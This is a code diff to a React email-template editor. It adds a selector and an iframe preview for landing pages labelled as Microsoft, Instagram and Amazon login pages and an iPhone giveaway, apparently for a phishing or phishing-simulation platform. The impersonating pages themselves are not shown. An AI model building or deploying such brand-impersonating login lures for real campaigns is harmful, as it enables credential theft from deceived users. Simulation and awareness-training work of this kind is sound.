@@ -21,6 +21,32 @@ const EmailTemplates = () => {
   const [activeCard, setActiveCard] = useState(null);
   const [editId, setEditId] = useState(null); // null when creating, id when editing
 
+  const templateOptions = [
+    {
+      label: "Microsoft Login",
+      value: "login.html",
+      preview: "/login.html",
+    },
+    {
+      label: "Instagram Login",
+      value: "instagram.html",
+      preview: "/instagram.html",
+    },
+    {
+      label: "Amazon Login",
+      value: "amazon.html",
+      preview: "/amazon.html",
+    },
+    {
+      label: "iPhone Giveaway",
+      value: "giveaway.html",
+      preview: "/giveaway.html",
+    },
+  ];
+  const [selectedTemplate, setSelectedTemplate] = useState(
+    templateOptions[0].value,
+  );
+
   // Insert verification link into editor
   const insertVerificationLink = (linkText = "Verify") => {
     const html = `<a href="{{verification_link}}">${linkText}</a>`;
@@ -798,6 +824,64 @@ const EmailTemplates = () => {
                         setFormData({ ...formData, content: html });
                       }}
                     />
+                  </div>
+
+                  <div style={{ marginBottom: 24 }}>
+                    <label
+                      htmlFor="template-select"
+                      style={{
+                        color: "#fff",
+                        fontWeight: 500,
+                        marginBottom: 8,
+                        display: "block",
+                      }}
+                    >
+                      Choose a template:
+                    </label>
+                    <select
+                      id="template-select"
+                      value={selectedTemplate}
+                      onChange={(e) => setSelectedTemplate(e.target.value)}
+                      style={{
+                        background: "#181c2f",
+                        color: "#fff",
+                        border: "1px solid #00f5ff",
+                        borderRadius: 6,
+                        padding: "8px 12px",
+                        fontSize: 16,
+                        width: 300,
+                        marginBottom: 16,
+                      }}
+                    >
+                      {templateOptions.map((opt) => (
+                        <option key={opt.value} value={opt.value}>
+                          {opt.label}
+                        </option>
+                      ))}
+                    </select>
+                    <div
+                      style={{
+                        background: "#222",
+                        borderRadius: 8,
+                        padding: 12,
+                        marginTop: 8,
+                        boxShadow: "0 2px 8px rgba(0,0,0,0.12)",
+                      }}
+                    >
+                      <iframe
+                        title="Template Preview"
+                        src={templateOptions.find(
+                          (opt) => opt.value === selectedTemplate,
+                        ).preview}
+                        style={{
+                          width: "100%",
+                          minHeight: 400,
+                          border: "none",
+                          borderRadius: 6,
+                          background: "#fff",
+                        }}
+                      />
+                    </div>
                   </div>
 
                   <div style={styles.formActions}>
